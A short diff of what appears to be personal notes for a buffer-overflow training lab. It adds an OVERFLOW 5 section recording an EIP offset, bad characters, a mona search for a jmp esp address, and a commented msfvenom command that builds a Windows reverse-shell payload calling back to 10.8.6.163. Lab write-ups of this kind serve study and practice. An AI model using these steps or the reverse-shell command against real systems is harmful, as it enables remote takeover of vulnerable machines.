@@ -108,7 +108,7 @@ hex2bytes("62501205")
 
 # ------------------------------------------------------------------------------------------------------------------------------------------
 
-## Overflow 5
+## Overflow 4
 
 # Fuzzing crashed at 2100 bytes
 
@@ -133,3 +133,28 @@ hex2bytes("62501205")
 
 print("OVERFLOW4")
 hex2bytes("625011AF")
+
+# --------------------------------------------------------------------------------------
+
+# Using the method as before we answer the rest of the tasks
+#......
+
+# --------------------------------------------------------------------------------------
+## OVERFLOW 5
+
+# EIP contains normal pattern : 0x356b4134 (offset 314)
+# ESP: 0x01A6FA30
+# Bad chars: 00 16 17 2f 30 f4 f5 fd
+# \x00\x16\x17\x2f\x30\xf4\xf5\xfd
+
+# New ESP: 0x019BFA30
+
+# find jumps
+
+# !mona jmp -r esp -cpb \x00\x16\x17\x2f\x30\xf4\xf5\xfd
+# 0x625011af : jmp esp |
+print("OVERFLOW5")
+hex2bytes("625011af")
+
+# Generate RevShell
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.8.6.163 LPORT=8888 EXITFUNC=thread -b "\x00\x16\x17\x2f\x30\xf4\xf5\xfd" -f c
